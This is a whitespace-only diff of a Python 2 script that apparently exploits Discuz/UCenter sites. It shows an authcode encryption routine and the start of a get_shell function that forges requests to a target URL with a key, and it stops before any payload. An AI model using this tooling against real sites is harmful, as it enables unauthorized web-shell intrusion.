@@ -1,14 +1,14 @@
 #!/usr/bin/env python
 # -*- coding: gbk -*-
 # -*- coding: gb2312 -*-
-# -*- coding: utf_8 -*- 
-# author iswin 
+# -*- coding: utf_8 -*-
+# author iswin
 import sys
 import hashlib
 import time
 import math
 import base64
-import urllib2 
+import urllib2
 import urllib
 import re
 
@@ -86,14 +86,14 @@ def microtime(get_as_float = False) :
         return time.time()
     else:
         return '%.8f %d' % math.modf(time.time())
- 
+
 def get_authcode(string, key = ''):
     ckey_length = 4
     key = hashlib.md5(key).hexdigest()
     keya = hashlib.md5(key[0:16]).hexdigest()
     keyb = hashlib.md5(key[16:32]).hexdigest()
     keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
-    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest() 
+    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()
     key_length = len(cryptkey)
     string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
     string_length = len(string)
@@ -118,7 +118,7 @@ def get_authcode(string, key = ''):
         box[j] = tmp
         result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
     return keyc + base64.b64encode(result).replace('=', '')
- 
+
 def get_shell(url,key,host):
     headers={'Accept-Language':'zh-cn',
     'Content-Type':'application/x-www-form-urlencoded',
